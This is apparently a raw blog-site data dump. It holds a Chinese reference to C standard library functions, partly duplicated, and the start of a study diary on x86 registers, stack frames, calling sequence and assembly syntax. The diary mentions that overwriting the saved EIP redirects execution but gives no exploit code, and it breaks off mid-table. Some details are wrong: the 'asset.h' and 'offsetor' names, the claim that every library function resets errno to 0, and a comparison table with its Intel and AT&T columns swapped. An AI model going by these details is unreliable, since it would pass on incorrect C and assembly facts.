*strcat(s,ct)</td>\n<td>把ct里的字符复制到s里已有的字符串之后。s应指定一个保存着字符串，而且足够大的字符数组。</td>\n</tr>\n<tr>\n<td>char *strncat(s,ct,n)</td>\n<td>把ct里的至多n个字符复制到s里已有的字符串之后。s应指定一个保存着字符串，而且足够大的字符数组。</td>\n</tr>\n<tr>\n<td>int strcmp(cs,ct)</td>\n<td>比较字符串cs和ct的大小，在cs大于、等于、小于ct时分别返回正值、0、负值。</td>\n</tr>\n<tr>\n<td>int strncmp(cs,ct,n)</td>\n<td>比较字符串cs和ct的大小，至多比较n个字符。在cs大于、等于、小于ct时分别返回正值、0、负值。</td>\n</tr>\n<tr>\n<td>char *strchr(cs,c)</td>\n<td>在cs中查寻c并返回c第一个出现的位置，用指向这个位置的指针表示。当cs里没有c时返回值NULL</td>\n</tr>\n<tr>\n<td>char *strrchr(cs,c)</td>\n<td>在cs中查寻c并返回c最后一个出现的位置，没有时返回NULL</td>\n</tr>\n<tr>\n<td>size_t strspn(cs,ct)</td>\n<td>由cs起确定一段全由ct里的字符组成的序列，返回其长度</td>\n</tr>\n<tr>\n<td>size_t strcspn(cs,ct)</td>\n<td>由cs起确定一段全由非ct里的字符组成的序列，返回其长度</td>\n</tr>\n<tr>\n<td>char *strpbrk(cs,ct)</td>\n<td>在cs里查寻ct里的字符，返回第一个满足条件的字符出现的位置，没有时返回NULL</td>\n</tr>\n<tr>\n<td>char *strstr(cs,ct)</td>\n<td>在cs中查寻串ct（查询子串），返回ct作为cs的子串的第一个出现的位置，ct未出现在cs里时返回NULL</td>\n</tr>\n<tr>\n<td>char *strerror(n)</td>\n<td>返回与错误编号n相关的错误信息串（指向该错误信息串的指针）</td>\n</tr>\n<tr>\n<td>char *strtok(s,ct)</td>\n<td>在s中查寻由ct中的字符作为分隔符而形成的单词</td>\n</tr>\n</tbody></table>\n<h3 id=\"存储区操作\"><a href=\"#存储区操作\" class=\"headerlink\" title=\"存储区操作\"></a><strong>存储区操作</strong></h3><p>​    &lt;string.h&gt;还有一组字符数组操作函数（存储区操作函数），名字都以mem开头，以某种高效方式实现。在下面原型中，参数s和t的类型是(void *)，cs和ct的类型是(const void *)，n的类型是size_t，c的类型是int（转换为unsigned char）。</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>void *memcpy(s,ct,n)</td>\n<td>从ct处复制n个字符到s处，返回s</td>\n</tr>\n<tr>\n<td>void *memmove(s,ct,n)</td>\n<td>从ct处复制n个字符到s处，返回s，这里的两个段允许重叠</td>\n</tr>\n<tr>\n<td>int memcmp(cs,ct,n)</td>\n<td>比较由cs和ct开始的n个字符，返回值定义同strcmp</td>\n</tr>\n<tr>\n<td>void *memchr(cs,c,n)</td>\n<td>在n个字符的范围内查寻c在cs中的第一次出现，如果找到，返回该位置的指针值，否则返回NULL</td>\n</tr>\n<tr>\n<td>void *memset(s,c,n)</td>\n<td>将s的前n个字符设置为c，返回s</td>\n</tr>\n</tbody></table>\n<h2 id=\"七、功能函数（-lt-stdlib-h-gt-）\"><a href=\"#七、功能函数（-lt-stdlib-h-gt-）\" class=\"headerlink\" title=\"七、功能函数（&lt;stdlib.h&gt;）\"></a><strong>七、功能函数（&lt;stdlib.h&gt;）</strong></h2><p>随机数函数：</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>int rand(void)</td>\n<td>生成一个0到RAND_MAX的随机整数</td>\n</tr>\n<tr>\n<td>void srand(unsigned seed)</td>\n<td>用seed为随后的随机数生成设置种子值</td>\n</tr>\n</tbody></table>\n<p>动态存储分配函数：</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>void *calloc(size_t n, size_t size)</td>\n<td>分配一块存储，其中足以存放n个大小为size的对象，并将所有字节用0字符填充。返回该存储块的地址。不能满足时返回NULL</td>\n</tr>\n<tr>\n<td>void *malloc(size_t size)</td>\n<td>分配一块足以存放大小为size的存储，返回该存储块的地址，不能满足时返回NULL</td>\n</tr>\n<tr>\n<td>void *realloc(void *p, size_t size)</td>\n<td>将p所指存储块调整为大小size，返回新块的地址。如能满足要求，新块的内容与原块一致；不能满足要求时返回NULL，此时原块不变</td>\n</tr>\n<tr>\n<td>void free(void *p)</td>\n<td>释放以前分配的动态存储块</td>\n</tr>\n</tbody></table>\n<h3 id=\"几个整数函数\"><a href=\"#几个整数函数\" class=\"headerlink\" title=\"几个整数函数\"></a><strong>几个整数函数</strong></h3><p>  几个简单的整数函数见下表，div_t和ldiv_t是两个预定义结构类型，用于存放整除时得到的商和余数。div_t类型的成分是int类型的quot和rem，ldiv_t类型的成分是long类型的quot和rem。</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>int abs(int n)</td>\n<td>求整数的绝对值</td>\n</tr>\n<tr>\n<td>long labs(long n)</td>\n<td>求长整数的绝对值</td>\n</tr>\n<tr>\n<td>div_t div(int n, int m)</td>\n<td>求n/m，商和余数分别存放到结果结构的对应成员里</td>\n</tr>\n<tr>\n<td>ldiv_t ldiv(long n, long m)</td>\n<td>同上，参数为长整数</td>\n</tr>\n</tbody></table>\n<h3 id=\"数值转换\"><a href=\"#数值转换\" class=\"headerlink\" title=\"数值转换\"></a><strong>数值转换</strong></h3><table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>double atof(const char *s)</td>\n<td>由串s构造一个双精度值</td>\n</tr>\n<tr>\n<td>int atoi(const char *s)</td>\n<td>由串s构造一个整数值</td>\n</tr>\n<tr>\n<td>long atol(const char *s)</td>\n<td>由串s构造一个长整数值</td>\n</tr>\n</tbody></table>\n<h3 id=\"执行控制\"><a href=\"#执行控制\" class=\"headerlink\" title=\"执行控制\"></a><strong>执行控制</strong></h3><p><em>1</em>）非正常终止函数abort。</p>\n<p>​     原型是： <em>void abort(void);</em></p>\n<p><em>2</em>）正常终止函数exit。</p>\n<p>​     原型是：<em>void exit(int status);</em></p>\n<p>  导致程序按正常方式立即终止。status作为送给执行环境的出口值，<em>0</em>表示成功结束，两个可用的常数为EXIT_SUCCESS，EXIT_FAILURE。</p>\n<p><em>3</em>）正常终止注册函数atexit。</p>\n<p>​     原型是：<em>int atexit(void (*fcn)(void))</em></p>\n<p>  可用本函数把一些函数注册为结束动作。被注册函数应当是无参无返回值的函数。注册正常完成时atexit返回值<em>0</em>，否则返回非零值。</p>\n<p><strong>与执行环境交互</strong></p>\n<p><em>1</em>）向执行环境传送命令的函数system。</p>\n<p>​      原型是：<em>int system(const char *s);</em></p>\n<p>  把串s传递给程序的执行环境要求作为系统命令执行。如以NULL为参数调用，函数返回非<em>0</em>表示环境里有命令解释器。如果s不是NULL，返回值由实现确定。</p>\n<p><em>2</em>）访问执行环境的函数getenv。</p>\n<p>​      原型是：<em>char *getenv(const char *s);</em></p>\n<p>  从执行环境中取回与字符串s相关联的环境串。如果找不到就返回NULL。本函数的具体结果由实现确定。在许多执行环境里，可以用这个函数去查看“环境变量”的值。</p>\n<h3 id=\"常用函数bsearch和qsort\"><a href=\"#常用函数bsearch和qsort\" class=\"headerlink\" title=\"常用函数bsearch和qsort\"></a><strong>常用函数bsearch和qsort</strong></h3><p><em>1</em>）二分法查找函数bsearch：</p>\n<p>  <em>void *bsearch(const void *key, const void *base,</em> <em>size_t n, size_t size,</em> <em>int (*cmp)(const void *keyval, const void *datum));</em></p>\n<p>  函数指针参数cmp的实参应是一个与字符串比较函数strcmp类似的函数，确定排序的顺序，当第一个参数keyval比第二个参数datum大、相等或小时分别返回正、零或负值。</p>\n<p><em>2</em>）快速排序函数qsort：</p>\n<p>   <em>void qsort(void *base, size_t n, size_t size,</em> <em>int (*cmp)(const void *, const void *));</em></p>\n<p>  qsort对于比较函数cmp的要求与bsearch一样。设有数组base[0],…,base[n-1]，元素大小为size。用qsort可以把这个数组的元素按cmp确定的上升顺序重新排列。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>标准头文件包括：</p>\n<p><em>&lt;asset.h&gt;   &lt;ctype.h&gt;    &lt;errno.h&gt;    &lt;float.h&gt;</em> </p>\n<p><em>&lt;limits.h&gt;    &lt;locale.h&gt;    &lt;math.h&gt;    &lt;setjmp.h&gt;</em> </p>\n<p><em>&lt;signal.h&gt;   &lt;stdarg.h&gt;   &lt;stddef.h&gt;   &lt;stdlib.h&gt;</em></p>\n<p><em>&lt;stdio.h&gt;   &lt;string.h&gt;    &lt;time.h&gt;</em></p>\n<p><strong>*<em>*一、标准定义（*</em>*<em>*&lt;stddef.h&gt;**</em>**）*</strong>** </p>\n<p>  文件&lt;stddef.h&gt;里包含了标准库的一些常用定义，无论我们包含哪个标准头文件，&lt;stddef.h&gt;都会被自动包含进来。</p>\n<p>  这个文件里定义：</p>\n<p> l  类型size_t  （sizeof运算符的结果类型，是某个无符号整型）；</p>\n<p> l  类型ptrdiff_t（两个指针相减运算的结果类型，是某个有符号整型）；</p>\n<p> l  类型wchar_t （宽字符类型，是一个整型，其中足以存放本系统所支持的所有本地环境中的字符集的所有编码值。这里还保证空字符的编码值为0）；</p>\n<p>  l  符号常量NULL （空指针值）；</p>\n<p> l  宏offsetor  （这是一个带参数的宏，第一个参数应是一个结构类型，第二个参数应是结构成员名。</p>\n<p>​          offsetor(s,m)求出成员m在结构类型t的变量里的偏移量）。</p>\n<p>  注：其中有些定义也出现在其他头文件里（如NULL）。</p>\n<h3 id=\"二、错误信息（-lt-errno-h-gt-）\"><a href=\"#二、错误信息（-lt-errno-h-gt-）\" class=\"headerlink\" title=\"二、错误信息（*&lt;errno.h&gt;*）\"></a><strong>二、错误信息（*&lt;errno.h&gt;*）</strong></h3><p>   &lt;errno.h&gt;定义了一个<em>int</em>类型的表达式<em>errno</em>，可以看作一个变量，其初始值为<em>0</em>，一些标准库函数执行中出错时将它设为非<em>0</em>值，但任何标准库函数都设置它为<em>0</em>。</p>\n<p>   <em>&lt;errno.h&gt;<em>里还定义了两个宏</em>EDOM</em>和<em>ERANGE</em>，都是非<em>0</em>的整数值。数学函数执行中遇到参数错误，就会将<em>errno</em>置为<em>EDOM</em>，如出现值域错误就会将<em>errno</em>置为<em>ERANGE</em>。</p>\n<h3 id=\"三、输入输出函数（-lt-stdio-h-gt-）\"><a href=\"#三、输入输出函数（-lt-stdio-h-gt-）\" class=\"headerlink\" title=\"三、输入输出函数（*&lt;stdio.h&gt;*）\"></a><strong>三、输入输出函数（*&lt;stdio.h&gt;*）</strong></h3><p><em>*<em>*</em>*文件打开和关闭：****</em>*</p>\n<p>   <em>FILE *fopen(const char *filename, const char *mode);</em></p>\n<p>   <em>int fclose(FILE * stream);</em></p>\n<p><em>*<em>*</em>*字符输入输出：****</em>*</p>\n<p>   <em>int fgetc(FILE *fp);</em></p>\n<p>   <em>int fputc(int c, FILE *fp);</em></p>\n<p>  getc和putc与这两个函数类似，但通过宏定义实现。通常有下面定义：</p>\n<p>   <em>#define getchar() getc(stdin)</em></p>\n<p>   <em>#define putchar(c) putc(c, stdout)</em></p>\n<p>   <em>int ungetc(int c, FILE* stream);//把字符 c 退回流 stream</em></p>\n<p><em>*<em>*</em>*格式化输入输出：****</em>*</p>\n<p>   <em>int scanf(const char *format, …);</em></p>\n<p>   <em>int printf(const char *format, …);</em></p>\n<p>   <em>int fscanf(FILE *stream, const char *format, …);</em></p>\n<p>   <em>int fprintf(FILE *stream, const char *format, …);</em></p>\n<p>   <em>int sscanf(char *s, const char *format, …);</em></p>\n<p>   <em>int sprintf(char *s, const char *format, …);</em></p>\n<p><em>*<em>*</em>*行式输入输出：****</em>*</p>\n<p>   <em>char *fgets(char *buffer, int n, FILE *stream);</em></p>\n<p>   <em>int fputs(const char *buffer, FILE *stream);</em></p>\n<p>   <em>char *gets(char *s);</em></p>\n<p>   <em>int puts(const char *s);</em></p>\n<p><em>*<em>*</em>*直接输入输出：****</em>*</p>\n<p>   <em>size_t fread(void *pointer, size_t size,</em> <em>size_t num, FILE *stream);</em></p>\n<p>   <em>size_t fwrite(const void *pointer, size_t size,</em> <em>size_t num, FILE *stream);</em></p>\n<p><em>*<em>*</em>*四、数学函数（*****&lt;math.h&gt;*****）****</em>*</p>\n<p>三角函数：</p>\n<table>\n<thead>\n<tr>\n<th>三角函数</th>\n<th>sin</th>\n<th>cos</th>\n<th>tan</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>反三角函数</td>\n<td>asin</td>\n<td>acos</td>\n<td>atan</td>\n</tr>\n<tr>\n<td>双曲函数</td>\n<td>sinh</td>\n<td>cosh</td>\n<td>tanh</td>\n</tr>\n</tbody></table>\n<p>指数和对数函数：</p>\n<table>\n<thead>\n<tr>\n<th>以<em>e</em>为底的指数函数</th>\n<th>exp</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>自然对数函数</td>\n<td>log</td>\n</tr>\n<tr>\n<td>以<em>10</em>为底的对数函数</td>\n<td>log10</td>\n</tr>\n</tbody></table>\n<p>其他函数：</p>\n<table>\n<thead>\n<tr>\n<th>平方根</th>\n<th>sqrt</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>绝对值</td>\n<td>fabs</td>\n</tr>\n<tr>\n<td>乘幂，第一个参数作为底，第二个是指数</td>\n<td>double pow(double, double)</td>\n</tr>\n<tr>\n<td>实数的余数，两个参数分别是被除数和除数</td>\n<td>double fmod(double, double)</td>\n</tr>\n</tbody></table>\n<p>注：所有上面未给出类型特征的函数都取一个参数，其参数与返回值都是double类型。</p>\n<p>下面函数返回双精度值（包括函数ceil和floor）。在下表里，除其中有特别说明的参数之外，所有函数的其他参数都是double类型。</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ceil(x)</td>\n<td>求出不小于<strong>x</strong>的最小整数（返回与这个整数对应的double值）</td>\n</tr>\n<tr>\n<td>floor(x)</td>\n<td>求出不大于<strong>x</strong>的最大整数（返回与这个整数对应的double值）</td>\n</tr>\n<tr>\n<td>atan2(y, x)</td>\n<td>求出 *tan-1(y/x)*，其值的范围是[-<em>pai,pai]</em></td>\n</tr>\n<tr>\n<td>ldexp(x, int n)</td>\n<td>求出<em>x*2n</em></td>\n</tr>\n<tr>\n<td>frexp(x, int *exp)</td>\n<td>把 <em>x</em>分解为 <em>y*2n</em>， 是位于区间 <em>[1/2,1)<em>里的一个小数，作为函数结果返回，整数</em>n</em> 通过指针<em>exp返回（应提供一个int变量地址）。当</em>x* 为<em>0</em>时这两个结果的值都是<em>0</em></td>\n</tr>\n<tr>\n<td>modf(x, double *ip)</td>\n<td>把<strong>x</strong>分解为小数部分和整数部分，小数部分作为函数返回值，整数部分通过指针*ip返回。</td>\n</tr>\n</tbody></table>\n<h3 id=\"五、字符处理函数（-lt-ctype-h-gt-）\"><a href=\"#五、字符处理函数（-lt-ctype-h-gt-）\" class=\"headerlink\" title=\"五、字符处理函数（*&lt;ctype.h&gt;*）\"></a><strong>五、字符处理函数（*&lt;ctype.h&gt;*）</strong></h3><p>见下表：</p>\n<table>\n<thead>\n<tr>\n<th>int isalpha(c)</th>\n<th>c是字母字符</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>int isdigit(c)</td>\n<td>c是数字字符</td>\n</tr>\n<tr>\n<td>int isalnum(c)</td>\n<td>c是字母或数字字符</td>\n</tr>\n<tr>\n<td>int isspace(c)</td>\n<td>c是空格、制表符、换行符</td>\n</tr>\n<tr>\n<td>int isupper(c)</td>\n<td>c是大写字母</td>\n</tr>\n<tr>\n<td>int islower(c)</td>\n<td>c是小写字母</td>\n</tr>\n<tr>\n<td>int iscntrl(c)</td>\n<td>c是控制字符</td>\n</tr>\n<tr>\n<td>int isprint(c)</td>\n<td>c是可打印字符，包括空格</td>\n</tr>\n<tr>\n<td>int isgraph(c)</td>\n<td>c是可打印字符，不包括空格</td>\n</tr>\n<tr>\n<td>int isxdigit(c)</td>\n<td>c是十六进制数字字符</td>\n</tr>\n<tr>\n<td>int ispunct(c)</td>\n<td>c是标点符号</td>\n</tr>\n<tr>\n<td>int tolower(int c)</td>\n<td>当c是大写字母时返回对应小写字母，否则返回c本身</td>\n</tr>\n<tr>\n<td>int toupper(int c)</td>\n<td>当c是小写字母时返回对应大写字母，否则返回c本身</td>\n</tr>\n</tbody></table>\n<p>注：条件成立时这些函数返回非<em>0</em>值。最后两个转换函数对于非字母参数返回原字符。</p>\n<h2 id=\"六、字符串函数（-lt-string-h-gt-）\"><a href=\"#六、字符串函数（-lt-string-h-gt-）\" class=\"headerlink\" title=\"六、字符串函数（*&lt;string.h&gt;*）\"></a><strong>六、字符串函数（*&lt;string.h&gt;*）</strong></h2><h3 id=\"字符串函数\"><a href=\"#字符串函数\" class=\"headerlink\" title=\"字符串函数\"></a><strong>字符串函数</strong></h3><p>   所有字符串函数列在下表里，函数描述采用如下约定：s、t表示 (char <em>)类型的参数，cs、ct表示(const  char</em>)类型的参数（它们都应表示字符串）。n表示size_t类型的参数（size_t是一个无符号的整数类型），c是整型参数（在函数里转换到char）：</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>size_t strlen(cs)</td>\n<td>求出cs的长度</td>\n</tr>\n<tr>\n<td>char *strcpy(s,ct)</td>\n<td>把ct复制到s。要求s指定足够大的字符数组</td>\n</tr>\n<tr>\n<td>char *strncpy(s,ct,n)</td>\n<td>把ct里的至多n个字符复制到s。要求s指定一个足够大的字符数组。如果ct里的字符不够n个，就在s里填充空字符。</td>\n</tr>\n<tr>\n<td>char *strcat(s,ct)</td>\n<td>把ct里的字符复制到s里已有的字符串之后。s应指定一个保存着字符串，而且足够大的字符数组。</td>\n</tr>\n<tr>\n<td>char *strncat(s,ct,n)</td>\n<td>把ct里的至多n个字符复制到s里已有的字符串之后。s应指定一个保存着字符串，而且足够大的字符数组。</td>\n</tr>\n<tr>\n<td>int strcmp(cs,ct)</td>\n<td>比较字符串cs和ct的大小，在cs大于、等于、小于ct时分别返回正值、0、负值。</td>\n</tr>\n<tr>\n<td>int strncmp(cs,ct,n)</td>\n<td>比较字符串cs和ct的大小，至多比较n个字符。在cs大于、等于、小于ct时分别返回正值、0、负值。</td>\n</tr>\n<tr>\n<td>char *strchr(cs,c)</td>\n<td>在cs中查寻c并返回c第一个出现的位置，用指向这个位置的指针表示。当cs里没有c时返回值NULL</td>\n</tr>\n<tr>\n<td>char *strrchr(cs,c)</td>\n<td>在cs中查寻c并返回c最后一个出现的位置，没有时返回NULL</td>\n</tr>\n<tr>\n<td>size_t strspn(cs,ct)</td>\n<td>由cs起确定一段全由ct里的字符组成的序列，返回其长度</td>\n</tr>\n<tr>\n<td>size_t strcspn(cs,ct)</td>\n<td>由cs起确定一段全由非ct里的字符组成的序列，返回其长度</td>\n</tr>\n<tr>\n<td>char *strpbrk(cs,ct)</td>\n<td>在cs里查寻ct里的字符，返回第一个满足条件的字符出现的位置，没有时返回NULL</td>\n</tr>\n<tr>\n<td>char *strstr(cs,ct)</td>\n<td>在cs中查寻串ct（查询子串），返回ct作为cs的子串的第一个出现的位置，ct未出现在cs里时返回NULL</td>\n</tr>\n<tr>\n<td>char *strerror(n)</td>\n<td>返回与错误编号n相关的错误信息串（指向该错误信息串的指针）</td>\n</tr>\n<tr>\n<td>char *strtok(s,ct)</td>\n<td>在s中查寻由ct中的字符作为分隔符而形成的单词</td>\n</tr>\n</tbody></table>\n<h3 id=\"存储区操作\"><a href=\"#存储区操作\" class=\"headerlink\" title=\"存储区操作\"></a><strong>存储区操作</strong></h3><p>​    &lt;string.h&gt;还有一组字符数组操作函数（存储区操作函数），名字都以mem开头，以某种高效方式实现。在下面原型中，参数s和t的类型是(void *)，cs和ct的类型是(const void *)，n的类型是size_t，c的类型是int（转换为unsigned char）。</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>void *memcpy(s,ct,n)</td>\n<td>从ct处复制n个字符到s处，返回s</td>\n</tr>\n<tr>\n<td>void *memmove(s,ct,n)</td>\n<td>从ct处复制n个字符到s处，返回s，这里的两个段允许重叠</td>\n</tr>\n<tr>\n<td>int memcmp(cs,ct,n)</td>\n<td>比较由cs和ct开始的n个字符，返回值定义同strcmp</td>\n</tr>\n<tr>\n<td>void *memchr(cs,c,n)</td>\n<td>在n个字符的范围内查寻c在cs中的第一次出现，如果找到，返回该位置的指针值，否则返回NULL</td>\n</tr>\n<tr>\n<td>void *memset(s,c,n)</td>\n<td>将s的前n个字符设置为c，返回s</td>\n</tr>\n</tbody></table>\n<h2 id=\"七、功能函数（-lt-stdlib-h-gt-）\"><a href=\"#七、功能函数（-lt-stdlib-h-gt-）\" class=\"headerlink\" title=\"七、功能函数（&lt;stdlib.h&gt;）\"></a><strong>七、功能函数（&lt;stdlib.h&gt;）</strong></h2><p>随机数函数：</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>int rand(void)</td>\n<td>生成一个0到RAND_MAX的随机整数</td>\n</tr>\n<tr>\n<td>void srand(unsigned seed)</td>\n<td>用seed为随后的随机数生成设置种子值</td>\n</tr>\n</tbody></table>\n<p>动态存储分配函数：</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>void *calloc(size_t n, size_t size)</td>\n<td>分配一块存储，其中足以存放n个大小为size的对象，并将所有字节用0字符填充。返回该存储块的地址。不能满足时返回NULL</td>\n</tr>\n<tr>\n<td>void *malloc(size_t size)</td>\n<td>分配一块足以存放大小为size的存储，返回该存储块的地址，不能满足时返回NULL</td>\n</tr>\n<tr>\n<td>void *realloc(void *p, size_t size)</td>\n<td>将p所指存储块调整为大小size，返回新块的地址。如能满足要求，新块的内容与原块一致；不能满足要求时返回NULL，此时原块不变</td>\n</tr>\n<tr>\n<td>void free(void *p)</td>\n<td>释放以前分配的动态存储块</td>\n</tr>\n</tbody></table>\n<h3 id=\"几个整数函数\"><a href=\"#几个整数函数\" class=\"headerlink\" title=\"几个整数函数\"></a><strong>几个整数函数</strong></h3><p>  几个简单的整数函数见下表，div_t和ldiv_t是两个预定义结构类型，用于存放整除时得到的商和余数。div_t类型的成分是int类型的quot和rem，ldiv_t类型的成分是long类型的quot和rem。</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>int abs(int n)</td>\n<td>求整数的绝对值</td>\n</tr>\n<tr>\n<td>long labs(long n)</td>\n<td>求长整数的绝对值</td>\n</tr>\n<tr>\n<td>div_t div(int n, int m)</td>\n<td>求n/m，商和余数分别存放到结果结构的对应成员里</td>\n</tr>\n<tr>\n<td>ldiv_t ldiv(long n, long m)</td>\n<td>同上，参数为长整数</td>\n</tr>\n</tbody></table>\n<h3 id=\"数值转换\"><a href=\"#数值转换\" class=\"headerlink\" title=\"数值转换\"></a><strong>数值转换</strong></h3><table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>double atof(const char *s)</td>\n<td>由串s构造一个双精度值</td>\n</tr>\n<tr>\n<td>int atoi(const char *s)</td>\n<td>由串s构造一个整数值</td>\n</tr>\n<tr>\n<td>long atol(const char *s)</td>\n<td>由串s构造一个长整数值</td>\n</tr>\n</tbody></table>\n<h3 id=\"执行控制\"><a href=\"#执行控制\" class=\"headerlink\" title=\"执行控制\"></a><strong>执行控制</strong></h3><p><em>1</em>）非正常终止函数abort。</p>\n<p>​     原型是： <em>void abort(void);</em></p>\n<p><em>2</em>）正常终止函数exit。</p>\n<p>​     原型是：<em>void exit(int status);</em></p>\n<p>  导致程序按正常方式立即终止。status作为送给执行环境的出口值，<em>0</em>表示成功结束，两个可用的常数为EXIT_SUCCESS，EXIT_FAILURE。</p>\n<p><em>3</em>）正常终止注册函数atexit。</p>\n<p>​     原型是：<em>int atexit(void (*fcn)(void))</em></p>\n<p>  可用本函数把一些函数注册为结束动作。被注册函数应当是无参无返回值的函数。注册正常完成时atexit返回值<em>0</em>，否则返回非零值。</p>\n<p><strong>与执行环境交互</strong></p>\n<p><em>1</em>）向执行环境传送命令的函数system。</p>\n<p>​      原型是：<em>int system(const char *s);</em></p>\n<p>  把串s传递给程序的执行环境要求作为系统命令执行。如以NULL为参数调用，函数返回非<em>0</em>表示环境里有命令解释器。如果s不是NULL，返回值由实现确定。</p>\n<p><em>2</em>）访问执行环境的函数getenv。</p>\n<p>​      原型是：<em>char *getenv(const char *s);</em></p>\n<p>  从执行环境中取回与字符串s相关联的环境串。如果找不到就返回NULL。本函数的具体结果由实现确定。在许多执行环境里，可以用这个函数去查看“环境变量”的值。</p>\n<h3 id=\"常用函数bsearch和qsort\"><a href=\"#常用函数bsearch和qsort\" class=\"headerlink\" title=\"常用函数bsearch和qsort\"></a><strong>常用函数bsearch和qsort</strong></h3><p><em>1</em>）二分法查找函数bsearch：</p>\n<p>  <em>void *bsearch(const void *key, const void *base,</em> <em>size_t n, size_t size,</em> <em>int (*cmp)(const void *keyval, const void *datum));</em></p>\n<p>  函数指针参数cmp的实参应是一个与字符串比较函数strcmp类似的函数，确定排序的顺序，当第一个参数keyval比第二个参数datum大、相等或小时分别返回正、零或负值。</p>\n<p><em>2</em>）快速排序函数qsort：</p>\n<p>   <em>void qsort(void *base, size_t n, size_t size,</em> <em>int (*cmp)(const void *, const void *));</em></p>\n<p>  qsort对于比较函数cmp的要求与bsearch一样。设有数组base[0],…,base[n-1]，元素大小为size。用qsort可以把这个数组的元素按cmp确定的上升顺序重新排列。</p>\n"},{"_content":"```\n学习日记1\n```\n\n### 汇编基础（x86）\n\n- 内存\n\n- 寄存器： \n\n- 1. 普通: EAX, EBX, ECX, EDX\n                 ESI, EDI, EBP, ESP\n  2. 段寄存器:      CS, DS, ES, FS, GS, SS\n  3. 特殊寄存器:      EIP, EFLAGS\n\n- 指令: \n\n- 1. push,pop\n  2. add/sub/mul/div,      xor, or\n  3. mov,      lea,\n  4. test,      cmp, jmp, call, ret\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155650349.png\" style=\"zoom:25%;\" />\n\n### 栈上的数据\n\nEIP存储的是下一条要执行的指令的地址，所以若EIP的值被修改为我们期望的地址，函数运行到ret时，程序将会跳到修改后的地址运行指令。根据上面来看，在进入函数时，通常栈上的数据是这样的。可以看出，ESP永远指向栈顶的位置，而EBP则永远指向当前函数空间的栈底。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155751637.png\" style=\"zoom:40%;\" />\n\n**IA32寄存器**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155828057.png\" style=\"zoom:25%;\" />\n\n**x86-64寄存器**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155850731.png\" style=\"zoom:25%;\" />\n\n**关键寄存器**\n\n- EIP： \n\n- - 指向下一条要被执行的指令，cpu将从eip指向的地址获取指令\n  - 不能被直接覆写\n\n- ESP： \n\n- - 指向栈顶\n  - PUSH/POP操作都基于操作ESP\n\n**基本指令**\n\n- 操作栈 \n\n- - push\n  - pop\n\n- 运算操作 \n\n- - add/sub/mul/div\n  - xor/or\n\n- 内存/寄存器操作 \n\n- - mov/lea\n\n- 条件执行 \n\n- - test，cmp，jmp\n  - jz，jnz，jg，ja\n\n- 子程序调用 \n\n- - call，ret\n\n**重要指令**\n\n- call     <function>:执行目标函数\n\n- - 把下一条指令（返回地址）压栈\n  - 跳转到目标函数\n  - 应该在函数调用完之后执行下一条指令\n\n- ret：返回调用\n\n- - 弹出（pop）栈顶，得到返回地址\n  - 跳转到跳转到返回地址（通过改变EIP）\n  - 应该跳转到调用方的下一条指令\n\n**函数调用时发生了什么**(x86)\n\n1. 传递参数\n2. call     函数地址（push eip，jmp 被调函数地址）\n3. ebp入栈，当前esp复制到ebp，esp减去一个数值，形成该函数的栈空间\n4. 初始化局部变量（自动变量）\n5. 运行函数指令\n6. 返回值传递\n7. pop ebp\n8. ret（pop     eip）\n\n这里没有提到平衡栈帧的操作，实际上根据调用约定的不同，这个操作会在调用者或被调用者两个地方进行。\n\n**Intel 和 AT&T语法**\n\n| **Intel Syntax** | **AT&T Syntax**   |\n| ---------------- | ----------------- |\n| mov  eax,1       | movl $1,  %eax    |\n| mov ebx,  0ffh   | movl  $0xff, %ebx |\n| int 80h          | int  $0x80        |\n\n```assembly\nsum: \n    push ebp\n    mov ebp, esp\n    mov eax, [ebp+12]\n    add eax, [ebp+8]\n    pop ebp\n    retn\nsum:\n    pushl %ebp\n    movl %esp,%ebp\n    movl 12(%ebp),%eax\n    addl 8(%ebp),%eax\n    popl %ebp\n    ret\n```\n\n| **Intel Syntax**                                     | **AT&T Syntax**                                              |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n| AT&T 语法先写源操作数，再写目标操作数                | Intel  语法先写目标操作数，再写源操作数：                    |\n| AT&T 语法将操作数的大小表示在指令的后缀中（b、w、l） | Intel  语法将操作数的大小表示在操作数的前缀中（BYTE PTR、WORD PTR、DWORD PTR） |\n| AT&T 语法总体上是offset(base, index, width)的格式    | Intel  语法总体上是[INDEX * WIDTH + BASE + OFFSET]的格式     |\n| AT&T 